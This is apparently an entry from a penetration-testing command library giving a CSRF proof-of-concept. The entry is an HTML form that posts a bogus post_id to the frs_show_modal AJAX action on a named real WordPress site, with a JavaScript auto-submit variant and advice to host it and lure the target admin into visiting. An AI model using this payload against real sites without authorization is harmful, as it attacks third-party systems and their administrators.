---
id: cmd-uuid-1
data: >-
  <form method=post
  action="https://eng.uber.com/wp-admin/admin-ajax.php?action=frs_show_modal">

  <input type=text name="post_id" value="zzz">

  <input type=submit>

  </form>
tags:
  - csrf
  - test
type: command
output: >-
  JSON response for logged-in users (confirms access); '0' for non-logged-in
  users
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:15.543Z'
verified: false
validated: true
submitted: true
---
# Test CSRF with frs_show_modal Form

## Command

```html
<form method=post action="https://eng.uber.com/wp-admin/admin-ajax.php?action=frs_show_modal">
<input type=text name="post_id" value="zzz">
<input type=submit>
</form>
```

## Description

Non-destructive HTML form to test CSRF access to the plugin's frs_show_modal AJAX endpoint by submitting a bogus post_id.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| action | AJAX action name | Yes |
| post_id | Bogus post ID for testing | Yes |

## Examples

### Basic Usage

Host the form on a site and have the target admin visit it.

```html
// As above
```

### Advanced Usage

Auto-submit with JS:

```html
<script>document.forms[0].submit();</script>
```

## Expected Output

JSON response indicating modal data for authenticated users; numeric '0' otherwise.

## Related

- [[Related Procedure: Test-AJAX-Functions-for-CSRF-Vulnerability]]
